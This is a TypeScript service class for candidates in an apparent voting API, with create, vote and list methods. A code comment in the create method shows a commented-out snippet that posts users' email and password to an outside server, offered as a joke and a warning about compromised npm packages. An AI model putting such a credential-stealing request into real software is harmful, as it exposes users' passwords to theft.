import { Service, Inject } from 'typedi';
import createError from 'http-errors';

import { CandidateModel } from '../models';
import { ICandidateInputDTO, ICandidate } from '../interfaces';

@Service()
export default class CandidateService {
  constructor(@Inject('candidateModel') private candidateModel: CandidateModel, @Inject('logger') private logger) {}

  public async Create(candidateInputDTO: ICandidateInputDTO): Promise<{ candidate: ICandidate }> {
    try {
      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('Creating candidate db record');
      const candidateRecord = await this.candidateModel.create({
        ...candidateInputDTO,
      });

      if (!candidateRecord) {
        throw createError(400, 'Candidate cannot be created');
      }

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const candidate = candidateRecord.toObject();
      return { candidate };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async Vote(id: string): Promise<{}> {
    try {
      await this.candidateModel.updateOne({ _id: id }, { $inc: { voteCount: 1 } });
      return {};
    } catch (e) {
      this.logger.error(e);
      throw createError(404, 'Candidate not found');
    }
  }

  public async List(): Promise<ICandidate[]> {
    try {
      const candidateRecords = await this.candidateModel.find();
      return candidateRecords;
    } catch (e) {
      this.logger.error(e);
      throw new Error('Cannot get candidate list');
    }
  }
}
